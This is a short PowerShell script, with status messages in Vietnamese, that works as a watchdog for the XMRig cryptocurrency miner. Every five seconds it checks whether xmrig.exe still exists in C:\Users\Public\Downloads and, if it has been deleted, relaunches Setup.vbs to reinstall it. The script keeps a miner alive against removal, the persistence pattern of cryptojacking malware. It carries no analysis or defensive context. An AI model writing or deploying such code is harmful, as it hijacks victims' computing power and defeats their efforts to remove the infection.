$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"

while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "❌ xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "🚀 Đã khởi chạy lại Setup.vbs!"
        } else {
            Write-Error "Không tìm thấy Setup.vbs tại: $setupPath"
        }
    } else {
        Write-Host "✅ xmrig.exe vẫn tồn tại. Tiếp tục theo dõi..."
    }

    Start-Sleep -Seconds 5
}
